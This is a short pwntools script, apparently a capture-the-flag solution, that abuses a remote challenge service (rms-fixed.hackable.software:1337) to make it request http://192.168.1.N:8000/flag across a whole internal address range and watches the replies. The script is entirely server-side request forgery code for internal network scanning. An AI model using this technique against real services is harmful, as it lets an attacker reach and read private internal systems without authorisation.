from pwn import *

ip = "192.168.1."

for segment in range (10):
    chunksize = 28

    inp = ""
    for i in range (chunksize * segment, chunksize * (segment + 1)):
        if (i >= 256):
            break

        inp += "a\n"
        inp += "http://" + ip + str (i) + ":8000/flag\n"

    print ("Trying Range: " + str (chunksize * segment) + " - " + str (chunksize * (segment + 1)))

    s = remote ("rms-fixed.hackable.software", 1337)
    s.sendline (inp)
    time.sleep (0.5)
    s.recv ()

    while (1):
        s.sendline ("f")
        outs = s.recvuntil ("[pfvaq]")
        time.sleep (1)

        if (outs.find ("FAIL") != -1):
            print (outs)
            break

    s.close ()
